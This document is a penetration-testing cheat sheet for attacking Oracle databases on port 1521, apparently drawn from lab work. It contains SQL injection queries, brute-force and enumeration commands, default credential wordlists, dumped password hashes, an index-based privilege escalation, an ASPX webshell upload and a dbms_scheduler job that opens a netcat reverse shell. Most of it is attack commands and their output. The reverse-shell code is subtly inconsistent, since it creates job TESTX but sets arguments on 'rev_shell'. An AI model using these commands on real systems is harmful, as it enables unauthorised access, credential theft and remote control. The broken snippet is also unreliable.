# 1521 - Oracle DB

## Commands

Check privileges:

`select * from user_role_privs;`

| Type                         | Command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Version                      | <p>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>SELECT version FROM v$instance;</p>                                                                                                                                                                                                                                                                                                                                          |
| Comments                     | <p>SELECT 1 FROM dual — comment<br>– NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</p>                                                                                                                                                                                                                                                                                                         |
| Current User                 | SELECT user FROM dual                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| List Users                   | <p>SELECT username FROM all_users ORDER BY username;<br>SELECT name FROM sys.user$; — priv</p>                                                                                                                                                                                                                                                                                                                                                                                                         |
| List Password Hashes         | <p>SELECT name, password, astatus FROM sys.user$ — priv, &#x3C;= 10g. astatus tells you if acct is locked<br>SELECT name,spare4 FROM sys.user$ — priv, 11g</p>                                                                                                                                                                                                                                                                                                                                         |
| Password Cracker             | [checkpwd](http://www.red-database-security.com/software/checkpwd.html) will crack the DES-based hashes from Oracle 8, 9 and 10.                                                                                                                                                                                                                                                                                                                                                                       |
| List Privileges              | <p>SELECT * FROM session_privs; — current privs<br>SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs<br>SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</p>                                                                                                                                                                                |
| List DBA Accounts            | SELECT DISTINCT grantee FROM dba\_sys\_privs WHERE ADMIN\_OPTION = ‘YES’; — priv, list DBAs, DBA roles                                                                                                                                                                                                                                                                                                                                                                                                 |
| Current Database             | <p>SELECT global_name FROM global_name;<br>SELECT name FROM v$database;<br>SELECT instance_name FROM v$instance;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</p>                                                                                                                                                                                                                                                                                                                                            |
| List Databases               | <p>SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<br>– Also query TNS listener for other databases. See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services</p>                                                                                                                                                                                                                                                                      |
| List Columns                 | <p>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</p>                                                                                                                                                                                                                                                                                                                                      |
| List Tables                  | <p>SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;</p>                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Find Tables From Column Name | SELECT owner, table\_name FROM all\_tab\_columns WHERE column\_name LIKE ‘%PASS%’; — NB: table names are upper case                                                                                                                                                                                                                                                                                                                                                                                    |
| Select Nth Row               | SELECT username FROM (SELECT ROWNUM r, username FROM all\_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)                                                                                                                                                                                                                                                                                                                                                                    |
| Select Nth Char              | SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| Bitwise AND                  | <p>SELECT bitand(6,2) FROM dual; — returns 2<br>SELECT bitand(6,1) FROM dual; — returns0</p>                                                                                                                                                                                                                                                                                                                                                                                                           |
| ASCII Value -> Char          | SELECT chr(65) FROM dual; — returns A                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Char -> ASCII Value          | SELECT ascii(‘A’) FROM dual; — returns 65                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Casting                      | <p>SELECT CAST(1 AS char) FROM dual;<br>SELECT CAST(’1′ AS int) FROM dual;</p>                                                                                                                                                                                                                                                                                                                                                                                                                         |
| String Concatenation         | SELECT ‘A’ \|\| ‘B’ FROM dual; — returns AB                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| If Statement                 | BEGIN IF 1=1 THEN dbms\_lock.sleep(3); ELSE dbms\_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements                                                                                                                                                                                                                                                                                                                                                                               |
| Case Statement               | <p>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</p>                                                                                                                                                                                                                                                                                                                                                                  |
| Avoiding Quotes              | SELECT chr(65) \|\| chr(66) FROM dual; — returns AB                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| Time Delay                   | <p>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<br>SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow<br>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow<br>SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow<br>– Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</p> |
| Make DNS Requests            | <p>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;<br>SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</p>                                                                                                                                                                                                                                                                                                                                                                          |
| Command Execution            | [Java](http://www.0xdeadbeef.info/exploits/raptor\_oraexec.sql)can be used to execute commands if it’s installed.[ExtProc](http://www.0xdeadbeef.info/exploits/raptor\_oraextproc.sql) can sometimes be used too, though it normally failed for me. ![:-(](http://pentestmonkey.net/wp-includes/images/smilies/icon\_sad.gif)                                                                                                                                                                          |
| Local File Access            | <p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used. Check that the following is non-null:<br>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it’s installed (it is not available in Oracle Express).</p>                                                                                                               |
| Hostname, IP Address         | <p>SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address<br>SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames</p>                                                                                                                                                                                                                                                                   |
| Location of DB files         | SELECT name FROM V$DATAFILE;                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Default/System Databases     | <p>SYSTEM<br>SYSAUX</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |

**\* Requires privileged user**

| Description             | Query                                                                                                                                                                                                                                                          |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Version                 | <p>SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';<br>SELECT banner FROM v$version WHERE banner LIKE 'TNS%';<br>SELECT version FROM v$instance;</p>                                                                                                  |
| User                    | SELECT user FROM dual                                                                                                                                                                                                                                          |
| Users                   | <p>SELECT username FROM all_users ORDER BY username;<br>* SELECT name FROM sys.user$;</p>                                                                                                                                                                      |
| Tables                  | <p>SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;</p>                                                                                                                                                                         |
| Tables From Column Name | SELECT owner, table\_name FROM all\_tab\_columns WHERE column\_name LIKE '%PASS%';                                                                                                                                                                             |
| Columns                 | <p>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';<br>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';</p>                                                                                              |
| Current Database        | <p>SELECT global_name FROM global_name;<br>SELECT name FROM V$DATABASE;<br>SELECT instance_name FROM V$INSTANCE;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</p>                                                                                                    |
| Databases               | SELECT DISTINCT owner FROM all\_tables;                                                                                                                                                                                                                        |
| DBA Accounts            | SELECT DISTINCT grantee FROM dba\_sys\_privs WHERE ADMIN\_OPTION = 'YES';                                                                                                                                                                                      |
| Privileges              | <p>SELECT * FROM session_privs;(Retrieves Current Privs)<br>* SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';<br>* SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</p> |
| Location of DB Files    | SELECT name FROM V$DATAFILE;                                                                                                                                                                                                                                   |
| Hostname, IP Address    | <p>SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; (Gets IP Address)<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; (Gets Hostnames)</p>                           |

## Enumeration

### oscanner

Install oscanner:

`apt-get install oscanner`

Run oscanner:

`oscanner -s 192.168.1.200 -P 1521`

### tnscmd10g

Fingerprint Oracle TNS Version

Fingerprint oracle tns:

`tnscmd10g version -h TARGET`

### Nmap

**Run nmap scripts against Oracle TNS:**

`nmap -p 1521 -A TARGET`

Find tns version:

`nmap --script=oracle-tns-version`

**Brute force oracle user accounts**

Identify default Oracle databases:

```
nmap --script oracle-sid-brute -p 1521 10.10.10.82
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 13:52 BST
Nmap scan report for 10.10.10.82
Host is up (0.084s latency).

PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-sid-brute: 
|_  XE
```

brute force users using the SID:

`nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>`

or

```
nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 <host>
```

### ODAT

[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)

ODAT (Oracle Database Attacking Tool) is an open source penetration testing tool that tests the security of Oracle Databases remotely.

Usage examples of ODAT:

* You have an Oracle database listening remotely and want to find valid SIDs and credentials in order to connect to the database
* You have a valid Oracle account on a database and want to escalate your privileges to become DBA or SYSDBA
* You have a Oracle account and you want to execute system commands (e.g. reverse shell) in order to move forward on the operating system hosting the database

Tested on Oracle Database 10g, 11g, 12c and 18c.

**Install**: download the latest release from the github repo

**Examples**:

#### Identify SIDs

```
root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82 
 
[1] (10.10.10.82:1521): Searching valid SIDs 
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server 
[+] 'XE' is a valid SID. Continue... 
[+] 'XEXDB' is a valid SID. Continue... 
100% |#####################################################################################################################################################| Time: 00:03:49 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 
100% |#####################################################################################################################################################| Time: 00:00:09 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) 
[+] 'XE' is a valid SID. Continue... 
100% |#####################################################################################################################################################| Time: 00:03:20 
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB 
```

#### identify users:

```
./odat-libc2.12-x86_64 passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/default.txt

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
[+] Valid credentials found: scott/tiger. Continue...                                   ##################################################################                                         | ETA:  00:00:05 
100% |#############################################################################################################################################################################################| Time: 00:00:24 
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```

**use the the wordlist below for just the default accounts**

find vulnarable modules:

```
odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
```

**Upload shell**

```
./odat-libc2.12-x86_64 dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
```

#### Get files

```
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```

### Metasploit

#### sid bruteforce:

```
msf auxiliary(admin/oracle/sid_brute) > run 

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt... 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID '' 
[*] 10.10.10.82:1521 - Done with brute force... 
[*] Auxiliary module execution completed 
```

#### tns version:

```
auxiliary/scanner/oracle/tnslsnr_version
```

#### sid enum:

```
auxiliary/scanner/oracle/sid_enum
```

#### username enumeration:

```
use auxiliary/scanner/oracle/oracle_login
```

#### index priv esc:

```
msf > use auxiliary/admin/oracle/oracle_index_privesc
msf auxiliary(oracle_index_privesc) > show actions
    ...actions...
msf auxiliary(oracle_index_privesc) > set ACTION < action-name >
msf auxiliary(oracle_index_privesc) > show options
    ...show and set options...
msf auxiliary(oracle_index_privesc) > run
```

#### execute sql queries:

```
use auxiliary/admin/oracle/oracle_sql
```

#### enumerate the database:

```
use auxiliary/admin/oracle/oraenum
msf auxiliary(oraenum) > info

Name: Oracle Database Enumeration
Module: auxiliary/admin/oracle/oraenum
License: Metasploit Framework License (BSD)
Rank: Normal

Provided by:
Carlos Perez <carlos_perez@darkoperator.com>

Basic options:
Name    Current Setting  Required  Description
----    ---------------  --------  -----------
DBPASS  TIGER            yes       The password to authenticate with.
DBUSER  SCOTT            yes       The username to authenticate with.
RHOST                    yes       The Oracle host.
RPORT   1521             yes       The TNS port.
SID     ORCL             yes       The sid to authenticate with.

Description:
This module provides a simple way to scan an Oracle database server
for configuration parameters that may be useful during a penetration
test. Valid database credentials must be provided for this module to
run.

msf auxiliary(oraenum) > set RHOST 192.168.56.163
RHOST => 192.168.56.163
msf auxiliary(oraenum) > set SID KNUTSEL
SID => KNUTSEL
msf auxiliary(oraenum) > set dbpass tiger
dbpass => tiger
msf auxiliary(oraenum) > run

[*] Running Oracle Enumeration....
[*] The versions of the Components are:
[*]      Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
[*]      PL/SQL Release 11.2.0.1.0 - Production
[*]      CORE     11.2.0.1.0     Production
[*]      TNS for Linux: Version 11.2.0.1.0 - Production
[*]      NLSRTL Version 11.2.0.1.0 - Production
[*] Auditing:
[*]      Database Auditing is enabled!
[*]      Auditing of SYS Operations is not enabled!
[*] Security Settings:
[*]      SQL92 Security restriction on SELECT is not Enabled
[*]      UTL Directory Access is set to
[*]      Audit log is saved at /u01/app/oracle/admin/KNUTSEL/adump
[*] Password Policy:
[*]      Current Account Lockout Time is set to 1
[*]      The Number of Failed Logins before an account is locked is set to 10
[*]      The Password Grace Time is set to 7
[*]      The Lifetime of Passwords is set to 180
[*]      The Number of Times a Password can be reused is set to UNLIMITED
[*]      The Maximum Number of Times a Password needs to be changed before it can be reused is set to UNLIMITED
[*]      The Number of Times a Password can be reused is set to UNLIMITED
[*]      Password Complexity is not checked
[*] Active Accounts on the System in format Username,Password,Spare4 are:
[*]      SYS,03E1E7984F880583,S:3CD57915E74AF162A5ABA3A30FE453E43DF884CB6A552C647B03572BA46D
[*]      SYSTEM,5A7270D7D12F6BA6,S:EDCB23E4039293C352B12D01EA52F2AF3311B5FA744BE3DCC728BDFE0655
[*]      DBSNMP,57E9C5ECCAB1777C,S:D9576CA642448980FB5C04D3869614D572E712BF5E019E02C31BBF300E76
[*]      SYSMAN,CB3E68076FBBAFF5,S:1132C132BFA6686735DEC4398F30DD411F0DDCAAAFCB4AC21527887B7129
[*]      MGMT_VIEW,23C5225CD5C2C782,S:0983A18B9809980B2ABE7A7A4047E5AA3925DC184C92047B6F5404E8CD11
[*]      APP_USER,71B0EFF101D0D5AC,S:13BAA4B46E85969429B3242E64E526292EB15BA071E3AAF37649CD3289BA
[*]      SCOTT,F894844C34402B67,S:7ED8346E4DA9EE29ACBB4A9D08B2E18B57404E6A9A03DB6AF01024BC0B8F
[*] Expired or Locked Accounts on the System in format Username,Password,Spare4 are:
[*]      OUTLN,4A3BA55E08595C81,S:8DF2965A946AB7ED6F6657A99B91CC792B67BF873D7CAFD3B20C98A28370
[*]      DIP,CE4A36B8E06CA59C,S:3E265D395D4D1A637729747CECC8BAD1CD8EFA262A8377E5635BB94434C5
[*]      ORACLE_OCM,5A2E026A9157958C,S:CDC4C09C00C4A8C25DCD1062BF8EC8BCB468841A1C77AB6E65188DF24D99
[*]      APPQOSSYS,519D632B7EE7F63A,S:B388B593D8609871990A15E991C82ACA154B0ADDA84E7CB549CFCC6E9B94
[*]      WMSYS,7C9BA362F8314299,S:A38520037B1C3904B76B3B65E8605DA4F89F710345F60FC7406A3FE9B709
[*]      XS$NULL,DC4FCC8CB69A6733,S:0327C110E72AE2E82F08AACBBBD385E4589FA1386F20119E1EE2A6AC8DC4
[*]      EXFSYS,33C758A8E388DEE5,S:BA1BB1B61AA7FE91BFF3CA99A116C2299F2DA8F87398D5560C20B74EDD00
[*]      XDB,88D8364765FCE6AF,S:7E885EEAC286739730FEDD138F83A361204D96FB92E35FFBDD89A494E32B
[*]      ANONYMOUS,anonymous,
[*]      APEX_PUBLIC_USER,E0781A84AA9234A8,S:934C76C08882384A2C51644F9C8302D40D32BFB83524BC4EC9EB84CA0221
[*]      ORDSYS,7EFA02EC7EA6B86F,S:74C72073718541C8074E24B1210367A6D702C01064580BFF4E5719AD8ECD
[*]      ORDDATA,A93EC937FCD1DC2A,S:C7267CE01C7CDCD0AF39C4289B7C66A3E0E75EAA3DC47D6143984256A9F1
[*]      ORDPLUGINS,88A2B2C183431F00,S:554026F9CFABC573E6A7B439716F69AF45A33D969FE7C16AA2E8CF702E34
[*]      SI_INFORMTN_SCHEMA,84B8CBCA4D477FA3,S:1C2A0B249085C3CEED0B29019231E49F35A56CDB8E0653B1E38E39B5AB8E
[*]      MDSYS,72979A94BAD2AF80,S:FE9431C8FA6CD61C1741389012B7D7B9ABD4213A612286E83E45F3E50A9E
[*]      FLOWS_FILES,110F19A4A024EB24,S:EB5CC126B7E3198814CC1B06065AF0E15259706E4036431D15F809527816
[*]      APEX_030200,A1A70E91605C5567,S:36A4A6B16BC8D55287D3E672FD86D72EA63C3749640A9DD668122E702F1E
[*] Accounts with DBA Privilege  in format Username,Hash on the System are:
[*]      SYS
[*]      APP_USER
[*]      SYSTEM
[*] Accounts with Alter System Privilege on the System are:
[*]      SYS
[*]      DBA
[*]      APEX_030200
[*] Accounts with JAVA ADMIN Privilege on the System are:
[*] Accounts that have CREATE LIBRARY Privilege on the System are:
[*]      SYS
[*]      XDB
[*]      EXFSYS
[*]      MDSYS
[*]      DBA
[*] Default password check:
[*]      The account DIP has a default password.
[*]      The account MDSYS has a default password.
[*]      The account XS$NULL has a default password.
[*]      The account OUTLN has a default password.
[*]      The account EXFSYS has a default password.
[*]      The account ORACLE_OCM has a default password.
[*]      The account SCOTT has a default password.
[*]      The account ORDPLUGINS has a default password.
[*]      The account ORDSYS has a default password.
[*]      The account APPQOSSYS has a default password.
[*]      The account ORDDATA has a default password.
[*]      The account XDB has a default password.
[*]      The account SI_INFORMTN_SCHEMA has a default password.
[*]      The account WMSYS has a default password.
[*] Auxiliary module execution completed
```

### Hydra

brute-force a listener password if exists:

```
./hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```

## Default accounts

| Username  | Password            |
| --------- | ------------------- |
| SYSTEM    | MANAGER             |
| SYS       | CHANGE\_ON\_INSTALL |
| DBSNMP    | DBSNMP              |
| SCOTT     | TIGER               |
| PCMS\_SYS | PCMS\_SYS           |
| WMSYS     | WMSYS               |
| OUTLN     | OUTLN               |

**Try lowercase as well**

**wordlist:**

```
SYSTEM/MANAGER
SYS/CHANGE_ON_INSTALL
DBSNMP/DBSNMP
SCOTT/TIGER
PCMS_SYS/PCMS_SYS
WMSYS/WMSYS
OUTLN/OUTLN
system/manager
sys/change_on_install
dbsnmp/dbsnmp
scott/tiger
pcms_sys/pcms_sys
wmsys/wmsys
outln/outln
```

## Connecting to Oracle DB

To interact with Oracle from our Kali box, there are three tools that can come in handy. sqlplus is required for odat to work properly:

Sqlplus will be installed with odat. So just install odat (apt install odat)

### Connect as normal user:

```
root@kali:~/hackthebox/silo# sqlplus SCOTT/tiger@10.10.10.82:1521/XE 
SQL*Plus: Release 12.2.0.1.0 Production on Thu Apr 26 08:54:27 2018 

Copyright (c) 1982, 2016, Oracle.  All rights reserved. 

Connected to: 
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 
 
SQL> 
```

### Connect as sysdba:

```
sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
```

## Privilege escalation

**Can also do the Metasploit module**

\*\*\*\* Oracle priv esc and obtain DBA access:

**Run netcat**: netcat -nvlp 443 code

`SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));`

**Run the exploit with a select query:**

`SQL> Select * from session_privs;`

**Remove the exploit using:**

`drop index exploit_1337;`

#### ODAT

```
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```

## reverse shell #1

```
begin
dbms_scheduler.create_job( job_name    => 'TESTX',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end;
/
```

If your trying to do this with sqlplus you need to put a / at the end to complete the operation

## reverse shell #1

```
find vulnarable modules:
odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba

upload shell:
./odat-libc2.12-x86_64 dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
```
